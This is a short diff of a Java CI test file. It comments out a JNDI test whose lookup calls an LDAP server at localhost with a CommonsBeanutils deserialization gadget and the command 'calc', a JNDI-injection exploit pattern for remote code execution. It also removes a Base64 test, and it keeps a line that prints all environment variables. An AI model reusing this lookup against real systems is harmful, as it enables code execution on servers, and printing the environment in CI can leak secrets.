@@ -15,19 +15,11 @@ public class CiTest {
         System.out.println("System.getenv(): " + System.getenv());
     }
 
-    @Test
-    public void jndi() throws NamingException
-    {
-        String gadget = "CommonsBeanutils2183NOCC";
-        Context ctx = new InitialContext();
-        Object result = ctx.lookup("ldap://127.0.0.1:1389/Deserialize/"+gadget+"/Command/calc");
-    }
-
-    @Test
-    public void baseTest() throws NamingException
-    {
-        String encText = "1234";
-        System.out.println(Base64.getUrlDecoder().decode(encText));
-//        isBase64();
-    }
+//    @Test
+//    public void jndi() throws NamingException
+//    {
+//        String gadget = "CommonsBeanutils2183NOCC";
+//        Context ctx = new InitialContext();
+//        Object result = ctx.lookup("ldap://127.0.0.1:1389/Deserialize/"+gadget+"/Command/calc");
+//    }
 }
